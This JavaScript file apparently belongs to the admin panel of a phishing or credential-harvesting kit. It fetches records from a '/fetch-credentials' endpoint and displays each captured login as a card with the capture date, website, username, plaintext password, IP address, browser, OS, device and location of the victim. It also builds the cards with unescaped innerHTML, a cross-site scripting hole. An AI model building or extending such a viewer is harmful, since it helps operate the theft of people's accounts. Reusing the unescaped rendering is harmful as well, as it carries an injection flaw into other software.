function create_login_card(one_login_data) {

	const date = new Date(one_login_data.date);

	// Customize format
	const options = { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
	const humanReadableDate = new Intl.DateTimeFormat('en-US', options).format(date);

	let login_card = `

	<div class="card mb-4 shadow" style="border-radius: 6px">
		<div class="card-body ">
			<table class="table table-bordered table-no-dark" style="font-size: 18px; font-weight: 500; border-radius: 10px!important;">
				<tbody>
					<tr>
						<td>Capture Date</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${humanReadableDate}</span>
						</td>
					</tr>
					<tr>
						<td>Website Name</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.website}</span>
						</td>
					</tr>
					<tr>
						<td>Username</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.username}</span>
						</td>
					</tr>
					<tr>
						<td>Password</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.password}</span>
						</td>
					</tr>
					<tr>
						<td>IP</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.ip_address}</span>
						</td>
					</tr>
					<tr>
						<td>Browser</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.browser}</span>
						</td>
					</tr>
					<tr>
						<td>OS</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.os}</span>
						</td>
					</tr>
					<tr>
						<td>Device</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.device}</span>
						</td>
					</tr>
					<tr>
						<td>Location</td>
						<td>
							<span class="badge bg-dark" style="font-size: 18px;">${one_login_data.location}</span>
						</td>
					</tr>

				</tbody>
			</table>
			<a href="#" class="card-link">More Info</a>
			<a href="#" class="card-link">Login Details</a>
		</div>
	</div>
	
	`;
	return login_card;
}

function populate_login_cards(login_data) {
	let login_data_holder = document.querySelector(".login-data-holder");
	login_data_holder.innerHTML = "";
	for (one_login_data of login_data) {
		login_data_holder.innerHTML += create_login_card(one_login_data);
	}
}

fetch("/fetch-credentials")
  .then(response => response.json())
  .then(responseData => {
	  populate_login_cards(responseData);
})